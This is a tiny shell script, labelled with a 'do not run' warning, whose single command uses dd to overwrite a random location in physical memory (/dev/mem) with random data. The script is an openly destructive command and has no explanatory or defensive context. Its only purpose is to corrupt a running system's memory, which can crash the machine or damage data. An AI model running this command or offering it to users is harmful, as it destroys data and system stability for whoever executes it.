#!/bin/sh
#Description: do not run. Overwrites random sectors of memory with random data
#you were warned
dd if=/dev/urandom of=/dev/mem bs=512 seek=$RANDOM
